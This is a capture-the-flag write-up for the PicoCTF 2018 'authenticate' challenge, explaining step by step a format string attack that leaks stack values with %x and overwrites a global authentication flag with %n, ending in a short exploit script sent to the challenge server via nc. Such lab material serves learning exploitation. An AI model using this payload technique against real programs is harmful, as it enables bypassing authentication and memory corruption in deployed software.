# Write-up for shellcode challenge
# PicoCTF_2018: authenticate

**Category:** Binary Exploitation
**Points:** 350

>Can you authenticate to this service and get the flag? Connect with nc 2018shell.picoctf.com 52918. Source.

> # Introduction
In this write-up we're gonna perform a format string attack. I shall show it with ASLR disabled.(See what ASLR is [here](https://github.com/giannoulispanagiotis/picoCTF-2018-wiretup/tree/master/got2learnlibc#aslr))

> # Vulnerability

As I said before, in this challenge Ι'm going to present to you a format string attack. And, what is that? You'll find soon.
First of all, let's disassemble our binary with gdb to see if we can find a vulnerability to exploit.

```asm
Dump of assembler code for function main:
=> 0x0804871d <+0>:	lea    ecx,[esp+0x4]
   0x08048721 <+4>:	and    esp,0xfffffff0
   0x08048724 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048727 <+10>:	push   ebp
   0x08048728 <+11>:	mov    ebp,esp
   0x0804872a <+13>:	push   ecx
   0x0804872b <+14>:	sub    esp,0x64
   0x0804872e <+17>:	mov    eax,ecx
   0x08048730 <+19>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048733 <+22>:	mov    DWORD PTR [ebp-0x5c],eax
   0x08048736 <+25>:	mov    eax,gs:0x14
   0x0804873c <+31>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804873f <+34>:	xor    eax,eax
   0x08048741 <+36>:	mov    eax,ds:0x804a044
   0x08048746 <+41>:	push   0x0
   0x08048748 <+43>:	push   0x2
   0x0804874a <+45>:	push   0x0
   0x0804874c <+47>:	push   eax
   0x0804874d <+48>:	call   0x8048520 <setvbuf@plt>
   0x08048752 <+53>:	add    esp,0x10
   0x08048755 <+56>:	call   0x80484e0 <getegid@plt>
   0x0804875a <+61>:	mov    DWORD PTR [ebp-0x50],eax
   0x0804875d <+64>:	sub    esp,0x4
   0x08048760 <+67>:	push   DWORD PTR [ebp-0x50]
   0x08048763 <+70>:	push   DWORD PTR [ebp-0x50]
   0x08048766 <+73>:	push   DWORD PTR [ebp-0x50]   
   0x08048769 <+76>:	call   0x8048540 <setresgid@plt>
   0x0804876e <+81>:	add    esp,0x10
   0x08048771 <+84>:	sub    esp,0xc
   0x08048774 <+87>:	push   0x8048968
   0x08048779 <+92>:	call   0x80484f0 <puts@plt>
   0x0804877e <+97>:	add    esp,0x10
   0x08048781 <+100>:	mov    eax,ds:0x804a040
   0x08048786 <+105>:	sub    esp,0x4
   0x08048789 <+108>:	push   eax
   0x0804878a <+109>:	push   0x40
   0x0804878c <+111>:	lea    eax,[ebp-0x4c]
   0x0804878f <+114>:	push   eax
   0x08048790 <+115>:	call   0x80484c0 <fgets@plt>
   0x08048795 <+120>:	add    esp,0x10
   0x08048798 <+123>:	sub    esp,0x8
   0x0804879b <+126>:	push   0x8048992
   0x080487a0 <+131>:	lea    eax,[ebp-0x4c]
   0x080487a3 <+134>:	push   eax
   0x080487a4 <+135>:	call   0x80484a0 <strstr@plt>
   0x080487a9 <+140>:	add    esp,0x10
   0x080487ac <+143>:	test   eax,eax
   0x080487ae <+145>:	je     0x80487ca <main+173>
   0x080487b0 <+147>:	sub    esp,0xc
   0x080487b3 <+150>:	push   0x8048995
   0x080487b8 <+155>:	call   0x80484f0 <puts@plt>
   0x080487bd <+160>:	add    esp,0x10
   0x080487c0 <+163>:	sub    esp,0xc
   0x080487c3 <+166>:	push   0x1
   0x080487c5 <+168>:	call   0x8048500 <exit@plt>
   0x080487ca <+173>:	sub    esp,0x8
   0x080487cd <+176>:	push   0x80489a6
   0x080487d2 <+181>:	lea    eax,[ebp-0x4c]
   0x080487d5 <+184>:	push   eax
   0x080487d6 <+185>:	call   0x80484a0 <strstr@plt>
   0x080487db <+190>:	add    esp,0x10
   0x080487de <+193>:	test   eax,eax
   0x080487e0 <+195>:	jne    0x8048801 <main+228>
   0x080487e2 <+197>:	sub    esp,0xc
   0x080487e5 <+200>:	push   0x80489aa
   0x080487ea <+205>:	call   0x80484f0 <puts@plt>
   0x080487ef <+210>:	add    esp,0x10
   0x080487f2 <+213>:	sub    esp,0xc
   0x080487f5 <+216>:	lea    eax,[ebp-0x4c]
   0x080487f8 <+219>:	push   eax
   0x080487f9 <+220>:	call   0x80484b0 <printf@plt>
   0x080487fe <+225>:	add    esp,0x10
   0x08048801 <+228>:	call   0x80486e4 <read_flag>
   0x08048806 <+233>:	mov    eax,0x0
   0x0804880b <+238>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804880e <+241>:	xor    edx,DWORD PTR gs:0x14
   0x08048815 <+248>:	je     0x804881c <main+255>
   0x08048817 <+250>:	call   0x80484d0 <__stack_chk_fail@plt>
   0x0804881c <+255>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x0804881f <+258>:	leave  
   0x08048820 <+259>:	lea    esp,[ecx-0x4]
   0x08048823 <+262>:	ret    
End of assembler dump.
```

Hmm, at first sight we can't find something wrong in this code (there is not gets here, fgets is safe unfortunately).But, running the code we notice that **0x080487f9 <+220>:	call   0x80484b0 <printf@plt>** takes only one argument (our input specifically).

![Screenshot from 2019-10-11 21-26-50](https://user-images.githubusercontent.com/37578272/66675391-e93a1900-ec6d-11e9-9478-c202105cd70b.png)

So, if our input is hello_world (like above) everything is gonna be alright:
printf("hello_world") gives us hello_world.
Think about it for minute before you see the solution.

If we parse as an argument something like "%d %d %d %d", what's going to happen?

![Screenshot from 2019-10-11 21-36-56](https://user-images.githubusercontent.com/37578272/66677578-9c0c7600-ec72-11e9-84a7-370eb777c5b6.png)
We see some random numbers. printf("%d %d %d %d") will search for addresses of 4 variables to print 4 integers.
However, we haven't parsed 2nd argument inside printf, hence the integers that it prints are some numbers in the stack. Same thing happens with "%x %x %x %x" and now we get some hex values:

![Screenshot from 2019-10-11 21-37-10](https://user-images.githubusercontent.com/37578272/66677581-9d3da300-ec72-11e9-9e37-d96a8c2dba01.png)


Where in the stack are those hex values? We're gonna find soon. But first, we didn't say how we are going to get this flag. 
Let's examine read_flag function.

```asm
Dump of assembler code for function read_flag:
   0x080486e4 <+0>:	push   ebp
   0x080486e5 <+1>:	mov    ebp,esp
   0x080486e7 <+3>:	sub    esp,0x8
   0x080486ea <+6>:	mov    eax,ds:0x804a04c
   0x080486ef <+11>:	test   eax,eax
   0x080486f1 <+13>:	jne    0x8048705 <read_flag+33>
   0x080486f3 <+15>:	sub    esp,0xc
   0x080486f6 <+18>:	push   0x8048934
   0x080486fb <+23>:	call   0x80484f0 <puts@plt>
   0x08048700 <+28>:	add    esp,0x10
   0x08048703 <+31>:	jmp    0x804871a <read_flag+54>
   0x08048705 <+33>:	sub    esp,0xc
   0x08048708 <+36>:	push   0x8048958
   0x0804870d <+41>:	call   0x80484f0 <puts@plt>
   0x08048712 <+46>:	add    esp,0x10
   0x08048715 <+49>:	call   0x804865b <flag>
   0x0804871a <+54>:	nop
   0x0804871b <+55>:	leave  
   0x0804871c <+56>:	ret    
End of assembler dump.
```
In this instruction: **0x080486ea <+6>:	mov    eax,ds:0x804a04c**  we notice an address(data segment). 0x804a04c is an address of a global variable called authenticated. Authenticated is initialized to zero. We then see, **test eax, eax**.
So, if we  modify authenticated variable, test will enable ZF(zero flag) and  we will jump to the flag function, which would give us the flag.
How can we modify it?

We know the address of variable (This instruction is hardcoded which means that authenticated variable will always be on this address, and this makes it easier for us--ASLR is disabled--), and we know that printf is a vulnerable function right now.

Have you ever heard about %n inside printf? 
Man page of printf tells us about %n:
![Screenshot from 2019-10-11 21-11-58](https://user-images.githubusercontent.com/37578272/66677231-da556580-ec71-11e9-8dbe-57f6fb354c97.png)

Ohhh that's too serious. "%n" let us write things in memory. For example:

printf("Hello World%n", &var): writes to var the length of Hello World (=11). Here, we don't have second argument, if we could find where in the stack were those printed values we saw above, with fgets we could parse the address of authenticated and with %n we could write to it. 

Let's test as input this: AAAAAAAA %x %x %x %x %x %x %x %x %x %x %x %x %x.

![Screenshot from 2019-10-11 22-03-26](https://user-images.githubusercontent.com/37578272/66677735-fad1ef80-ec72-11e9-90ea-0d592a15c845.png)

We hitted the A's of our input and the first %x (0x782520-->ascii code of %x). So, if we change first 4 A's with variable's address and decrease %x's by 2 the last hex value will be the address.

```bash
python -c 'print "\x4c\xa0\x04\08" + "AAAA" + "%x "*11' | ./auth
```
![Screenshot from 2019-10-11 22-18-43](https://user-images.githubusercontent.com/37578272/66678683-1fc76200-ec75-11e9-988c-cf28b3053e14.png)

And it's true. Therefor, we change the last "%x" with a "%n". So in the address: 0x0804a04c %n will print length of \x4c\xa0\x04\08AAAA"%x "*10. 

Autenticated will be modified and we'll get the flag. Let's do it. 

Our exploit:
```bash
#!/bin/bash 
 
python -c 'print "\x4c\xa0\x04\x08" + "AAAA" +  "%x "*10 + "%n"' > payload 
 
cat payload | nc 2018shell.picoctf.com 52918 | tail -1  
```

Congrats, we got our flag. See you in the next challenge.




